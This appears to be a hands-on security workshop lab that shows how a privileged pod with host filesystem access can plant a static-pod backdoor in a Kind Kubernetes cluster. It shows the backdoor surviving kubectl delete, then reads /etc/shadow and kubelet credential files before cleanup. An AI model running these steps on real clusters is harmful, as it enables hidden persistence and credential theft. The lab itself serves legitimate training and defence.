# Static Pods

An attacker who gains write access to a node's filesystem can drop a manifest file into the kubelet's static pod directory. The kubelet creates the pod immediately — with no involvement from the API server's admission controllers — and automatically restarts it if it is deleted through `kubectl`. This makes static pods one of the most persistent and difficult-to-remove backdoor techniques in Kubernetes.

## Description

Static pods are managed directly by the `kubelet` daemon on a specific node, not by the Kubernetes control plane. Key attacker-relevant properties:

- **Bypasses admission controllers** — mutating and validating webhooks (e.g., OPA/Gatekeeper, Kyverno) are not invoked for static pods.
- **Mirror pods are visible but not deletable** — the API server creates a read-only "mirror pod" so the pod appears in `kubectl get pods`, but issuing `kubectl delete pod` only removes the mirror; the kubelet recreates the mirror within seconds.
- **Survives API server outages** — the kubelet manages the pod lifecycle independently.
- **Persistence on the node** — as long as the manifest file exists on the node's filesystem, the pod will always be running.

The attack requires writing a file to `/etc/kubernetes/manifests/` (or wherever the kubelet's `staticPodPath` is configured). This is typically achieved by first obtaining a privileged container that mounts the host filesystem.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- The attacker has obtained credentials that grant `create pods` with `privileged: true` and a `hostPath` volume mount (or direct node access via SSH).

## Quick Start

### Step 1 — Deploy a privileged pod with host filesystem access

The first stage of this attack is obtaining write access to the node's filesystem. Deploy a privileged pod that mounts the host root filesystem at `/host`:

```bash
kubectl apply -f privileged-pod.yaml
```

Wait for the pod to start:

```bash
kubectl wait --for=condition=Ready pod/node-access --timeout=60s
```

Confirm you can read the host filesystem:

```bash
kubectl exec node-access -- ls /host/etc/kubernetes/
```

Expected output (on the Kind control-plane node):

```
admin.conf  controller-manager.conf  kubelet.conf  manifests  pki  scheduler.conf  super-admin.conf
```

### Step 2 — Locate the kubelet static pod directory

The kubelet reads static pod manifests from the path configured in its config file. On kubeadm-based clusters (including Kind) this is `/etc/kubernetes/manifests`:

```bash
kubectl exec node-access -- cat /host/var/lib/kubelet/config.yaml | grep static
```

Expected output:

```
staticPodPath: /etc/kubernetes/manifests
```

Inspect the existing static pod manifests (control-plane components on the node):

```bash
kubectl exec node-access -- ls /host/etc/kubernetes/manifests/
```

Expected output on a control-plane node:

```
etcd.yaml  kube-apiserver.yaml  kube-controller-manager.yaml  kube-scheduler.yaml
```

### Step 3 — Write the malicious static pod manifest

The file `static-pod-manifest.yaml` defines a privileged backdoor pod. Copy it to the node's static pod directory through the `/host` mount using `kubectl cp`:

```bash
kubectl cp static-pod-manifest.yaml \
    node-access:/host/etc/kubernetes/manifests/static-backdoor.yaml
```

Verify the file was written:

```bash
kubectl exec node-access -- ls -la /host/etc/kubernetes/manifests/static-backdoor.yaml
```

> **Note:** The `kubectl exec -- sh -c "cat > /path" < localfile` pattern does **not** work with `kubectl exec` — stdin redirection applies to the local shell, not the exec session. Use `kubectl cp` to transfer files into a running pod.

### Step 4 — Observe the kubelet create the static pod

The kubelet watches the manifest directory and picks up new files within a few seconds. The pod will appear in the API server as a mirror pod:

```bash
kubectl get pods -n kube-system --watch
```

Look for a pod with a node-name suffix matching the cluster name and node (e.g., `static-backdoor-kind-control-plane` for a cluster named `kind`). This is the mirror pod created by the API server.

Expected output:

```
NAME                                         READY   STATUS    RESTARTS   AGE
static-backdoor-kind-control-plane           1/1     Running   0          8s
```

> **Note:** The mirror pod name suffix is `<cluster-name>-control-plane`. For a cluster named `workshop-cluster` it would be `static-backdoor-workshop-cluster-control-plane`.

### Step 5 — Demonstrate that kubectl delete does NOT remove the pod

Try to delete the mirror pod using kubectl (replace the suffix with your actual pod name from Step 4):

```bash
kubectl delete pod -n kube-system static-backdoor-kind-control-plane
```

Expected output:

```
pod "static-backdoor-kind-control-plane" deleted
```

Wait a few seconds and check again:

```bash
kubectl get pods -n kube-system | grep static-backdoor
```

The pod is back. The kubelet recreates the mirror pod immediately because the manifest file still exists on disk. **The only way to remove a static pod is to delete the manifest file from the node.**

### Step 6 — Verify host-level capabilities of the static pod

Exec into the static pod and confirm its capabilities (replace the pod name suffix as needed):

```bash
kubectl exec -n kube-system static-backdoor-kind-control-plane -- sh -c '
  # Read host /etc/shadow
  cat /host/etc/shadow | head -5

  # Read kubelet credentials
  ls /host/etc/kubernetes/pki/ 2>/dev/null || ls /host/var/lib/kubelet/pki/

  # List host processes
  ls /proc | head -20
'
```

### Step 7 — Clean up: remove the manifest file

Removing the static pod requires deleting the manifest file from the node filesystem — not just running `kubectl delete`:

```bash
kubectl exec node-access -- rm /host/etc/kubernetes/manifests/static-backdoor.yaml
```

Confirm the static pod is gone:

```bash
kubectl get pods -n kube-system | grep static-backdoor
```

## Cleanup

```bash
# Remove the manifest file from the node (if not already done in Step 7)
kubectl exec node-access -- rm -f /host/etc/kubernetes/manifests/static-backdoor.yaml

# Wait a few seconds and confirm the static pod mirror is gone
kubectl get pods -n kube-system | grep static-backdoor

# Delete the privileged pod used for node access
kubectl delete -f privileged-pod.yaml
```

> **Emergency cleanup:** If the `node-access` pod is no longer running, you can remove the manifest file directly via Docker:
> ```bash
> docker exec kind-control-plane rm -f /etc/kubernetes/manifests/static-backdoor.yaml
> ```

## Resources

- [Static Pods](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)
- [Kubelet Configuration](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/)
- [MITRE ATT&CK for Containers — Static Pods](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Static%20Pods/)
